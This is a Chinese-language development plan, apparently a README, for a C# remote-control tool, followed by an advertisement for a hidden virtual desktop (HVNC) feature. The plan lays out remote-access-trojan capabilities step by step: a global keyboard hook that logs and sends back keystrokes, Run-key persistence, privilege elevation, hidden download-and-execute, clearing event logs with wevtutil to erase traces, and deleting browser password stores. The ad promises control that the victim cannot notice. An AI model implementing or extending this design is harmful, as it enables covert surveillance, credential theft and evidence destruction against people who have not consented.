# RemoteControl
远程控制全功能远程控制实现计划
Task 1: 服务端右键菜单框架搭建
重构 FrmMain 主界面，在客户端列表（TreeView）上添加右键菜单，匹配客户截图中的菜单结构。修改文件：
RemoteControl.Server/FrmMain.Designer.cs — 添加 ContextMenuStrip 及所有菜单项
RemoteControl.Server/FrmMain.cs — 添加菜单事件处理方法（先留空桩函数）
菜单结构：
plaintext
右键菜单 (contextMenuStripClient)
├── 主机功能(Z) ►
│   ├── 文件管理(F)         [已有功能，连接现有逻辑]
│   ├── 屏幕监控(S)         [已有]
│   ├── 高清屏幕
│   ├── 后台屏幕(G)
│   ├── 系统管理(M)
│   ├── 视频查看(V)         [已有]
│   ├── 远程终端(T)         [已有]
│   ├── 语音监听(W)         [已有]
│   ├── 键盘记录(K)
│   ├── 服务管理(S)
│   └── 注册表(R)           [已有]
├── 增强功能(I) ►
│   ├── 写入启动 / 写Run启动(X)
│   ├── 重启EXP(E)
│   ├── 提升权限(S)
│   ├── 开关代理(P)
│   ├── 代理映射(M)
│   ├── 远程聊天(C)
│   ├── 娱乐功能(H)
│   ├── 消息弹窗(M)         [已有]
│   ├── 更改备注(B)
│   ├── 查找进程(P)         [已有]
│   ├── 查找窗口(W)
│   └── 清除查找(C)
├── 附加功能(F) ►
│   └── (预留)
├── 其他功能(O) ►
│   ├── 本地上传(L)
│   ├── 显示打开(N)
│   ├── 隐藏打开(H)
│   ├── 下载执行(D)
│   ├── 下载更新(U)
│   ├── 复制IP地址(I)
│   ├── 复制所有信息(A)
│   └── 导出IP列表(I)
├── 会话管理(S) ►
│   ├── 注销主机(L)
│   ├── 重启主机(R)
│   ├── 关机命令(S)         [已有]
│   └── 卸载主机(U)
├── 清理日志(C) ►
│   ├── 清理全部日志(A)
│   ├── 清理系统日志(S)
│   ├── 清理安全日志(Q)
│   └── 清理应用程序(Y)
├── 更改分组(C)
├── 清除浏览器账号密码(X) ►
│   ├── 删除IE历史记录
│   ├── 清除谷歌帐号密码
│   ├── 清除Skype帐号密码
│   ├── 清除火狐帐号密码
│   ├── 清除360帐号密码
│   ├── 清除QQ帐号密码
│   └── 清除搜狗帐号密码
├── 选择全部(A)
└── 取消选择(U)
Task 2: 协议层扩展 — 新增包类型和Request/Response类
修改文件：
RemoteControl.Protocals/Codec/ePacketType.cs — 新增约25种包类型
RemoteControl.Protocals/Codec/CodecFactory.cs — 注册新类型映射
新建文件（Request类）：
RemoteControl.Protocals/Request/RequestClearLog.cs — 日志清理请求（含日志类型枚举）
RemoteControl.Protocals/Request/RequestClearBrowserData.cs — 清除浏览器数据请求
RemoteControl.Protocals/Request/RequestRunFile.cs — 运行文件请求（含显示/隐藏/提权模式）
RemoteControl.Protocals/Request/RequestCompressFile.cs — 压缩文件请求
RemoteControl.Protocals/Request/RequestDecompressFile.cs — 解压文件请求
RemoteControl.Protocals/Request/RequestGetFileProperty.cs — 获取文件属性请求
RemoteControl.Protocals/Request/RequestWriteStartup.cs — 写入启动项请求
RemoteControl.Protocals/Request/RequestRestartExplorer.cs — 重启Explorer请求
RemoteControl.Protocals/Request/RequestElevatePrivilege.cs — 提升权限请求
RemoteControl.Protocals/Request/RequestToggleProxy.cs — 开关代理请求
RemoteControl.Protocals/Request/RequestProxyMapping.cs — 代理映射请求
RemoteControl.Protocals/Request/RequestKeylogger.cs — 键盘记录请求
RemoteControl.Protocals/Request/RequestServiceManager.cs — 服务管理请求
RemoteControl.Protocals/Request/RequestDownloadExec.cs — 下载执行请求
RemoteControl.Protocals/Request/RequestUninstall.cs — 卸载主机请求
新建文件（Response类）：
RemoteControl.Protocals/Response/ResponseClearLog.cs
RemoteControl.Protocals/Response/ResponseClearBrowserData.cs
RemoteControl.Protocals/Response/ResponseGetFileProperty.cs
RemoteControl.Protocals/Response/ResponseServiceManager.cs
RemoteControl.Protocals/Response/ResponseKeylogger.cs
RemoteControl.Protocals/Response/ResponseGetDrivesEx.cs — 扩展磁盘信息（类型/总大小/可用空间）
Task 3: 文件管理增强
3.1 磁盘信息扩展（类型、总大小、可用空间）
修改文件：
RemoteControl.Client/Handlers/RequestGetDrivesHandler.cs — 返回扩展磁盘信息
RemoteControl.Server/FrmMain.cs — 处理新响应，显示磁盘类型/大小/可用空间列
RemoteControl.Server/FrmMain.Designer.cs — 增加 ListView 列头
3.2 文件右键菜单增强
修改文件：
RemoteControl.Server/FrmMain.Designer.cs — 文件列表右键菜单增加：显示运行、隐藏运行、提权运行、压缩文件、解压文件、属性
RemoteControl.Server/FrmMain.cs — 对应事件处理
3.3 客户端处理器
新建文件：
RemoteControl.Client/Handlers/RequestRunFileHandler.cs — 处理显示/隐藏/提权运行
RemoteControl.Client/Handlers/RequestCompressFileHandler.cs — 压缩文件
RemoteControl.Client/Handlers/RequestDecompressFileHandler.cs — 解压文件
RemoteControl.Client/Handlers/RequestGetFilePropertyHandler.cs — 获取文件属性
修改文件：
RemoteControl.Client/Program.cs — 注册新Handler
Task 4: 会话管理功能
新建文件：
RemoteControl.Client/Handlers/RequestUninstallHandler.cs — 卸载主机（删除自身、清理注册表启动项）
修改文件：
RemoteControl.Client/Handlers/RequestPowerHandler.cs — 增加注销支持
RemoteControl.Client/Program.cs — 注册卸载Handler
RemoteControl.Server/FrmMain.cs — 会话管理菜单事件：发送对应的关机/重启/注销/卸载请求
Task 5: 清理日志功能
新建文件：
RemoteControl.Client/Handlers/RequestClearLogHandler.cs — 通过 wevtutil cl 命令清理Windows事件日志
修改文件：
RemoteControl.Client/Program.cs — 注册Handler
RemoteControl.Server/FrmMain.cs — 菜单事件处理
Task 6: 清除浏览器账号密码
新建文件：
RemoteControl.Client/Handlers/RequestClearBrowserDataHandler.cs — 删除各浏览器的Cookie/密码文件
IE: 调用 RunDll32.exe InetCpl.cpl,ClearMyTracksByProcess
Chrome: 删除 %LocalAppData%\Google\Chrome\User Data\Default\Login Data
Firefox: 删除 %AppData%\Mozilla\Firefox\Profiles\*\logins.json
360/QQ/搜狗: 删除对应路径的数据文件
修改文件：
RemoteControl.Client/Program.cs — 注册Handler
RemoteControl.Server/FrmMain.cs — 菜单事件处理
Task 7: 增强功能实现
7.1 写入启动/写Run启动
客户端写入注册表 HKCU\Software\Microsoft\Windows\CurrentVersion\Run
7.2 重启Explorer
客户端 taskkill /f /im explorer.exe 后 start explorer.exe
7.3 提升权限
客户端尝试以管理员权限重新启动自身
7.4 开关代理
修改注册表 HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings 的 ProxyEnable
7.5 键盘记录
新建 RemoteControl.Client/Handlers/RequestKeyloggerHandler.cs
使用 SetWindowsHookEx 全局键盘钩子，记录并定期回传
7.6 服务管理
使用 ServiceController API 获取服务列表，支持启动/停止/删除服务
7.7 其他功能
复制IP地址/复制所有信息/导出IP列表：纯服务端操作（操作剪贴板/导出文件）
下载执行/下载更新：发送URL给客户端，客户端下载后执行
更改备注/分组：服务端本地数据操作
新建文件：
RemoteControl.Client/Handlers/RequestWriteStartupHandler.cs
RemoteControl.Client/Handlers/RequestRestartExplorerHandler.cs
RemoteControl.Client/Handlers/RequestElevatePrivilegeHandler.cs
RemoteControl.Client/Handlers/RequestToggleProxyHandler.cs
RemoteControl.Client/Handlers/RequestKeyloggerHandler.cs
RemoteControl.Client/Handlers/RequestServiceManagerHandler.cs
RemoteControl.Client/Handlers/RequestDownloadExecHandler.cs
RemoteControl.Client/Handlers/RequestUninstallHandler.cs
RemoteControl.Server/FrmServiceManager.cs + .Designer.cs — 服务管理窗体
Task 8: 编译验证
每完成一个 Task 后执行 MSBuild 编译验证，确保无编译错误。
实现顺序
Task 1（菜单框架） → 2. Task 2（协议层） → 3. Task 3（文件管理） → 4. Task 4（会话管理） → 5. Task 5（清理日志） → 6. Task 6（浏览器清理） → 7. Task 7（增强功能） → 8. Task 8（最终编译验证）

# 云服务器编号/别名： #8432 / MyServer,链接新的服务器，执行服务器部署中转，然后在桌面端接入服务器中转做为中转，总端生成客户端可以链接


# 需要主控副控都有

隐藏屏幕

颠覆传统控制：HVNC 隐形网络虚拟控制系统

您是否需要一种更安全、更隐蔽的远程管理方案？HVNC（Hidden Virtual Network Computing） 带来全新突破！

与传统远程桌面（VNC）不同，HVNC 采用尖端的虚拟桌面隔离技术：

全隐形无感操控：直击用户痛点，实现零弹窗、零闪烁、零感知。在底层链路完成高并发操作，将前台干扰降至绝对零度。

独立并发：支持在后台开辟完全独立的虚拟桌面，与前台操作互不干扰，实现真正的“双轨并行”。在被控端开辟完全隔离的“影子原生桌面”，极致释放技术支持与隐蔽审计的生产力。

无论是高级技术支持、隐蔽式安全审计，还是高效的自动化运维，HVNC 都能为您提供极致流畅、了无痕迹的掌控体验。